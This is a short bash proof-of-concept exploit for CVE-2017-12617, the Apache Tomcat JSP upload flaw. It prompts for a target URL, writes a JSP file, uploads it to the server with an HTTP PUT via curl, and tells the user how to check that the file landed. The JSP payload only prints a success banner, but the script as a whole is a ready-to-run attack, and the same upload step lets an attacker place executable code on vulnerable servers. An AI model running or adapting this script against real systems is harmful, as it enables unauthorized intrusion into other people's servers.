#!/bin/bash
# to use, type sh CVE-2017-12617.sh and give a URL when prompted
# https://bz.apache.org/bugzilla/show_bug.cgi?id=61542

echo Give the target sites URL
read urlname
echo 'Creating test exploit'
echo ''
echo ''
echo ''
echo "<% out.write(\"<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>\"); %>" > exploit.jsp 
echo trying to upload exploit.jsp to the given URL
request=$(curl -X PUT $urlname/exploit.jsp -d @- < exploit.jsp)
echo 'Printing Response...'
echo ''
echo ''
echo ''
echo $request
echo ''
echo ''
echo ''
echo ''
echo "Check if your file is uploaded by browsing to the target address or: curl http://$urlname/exploit.jsp"
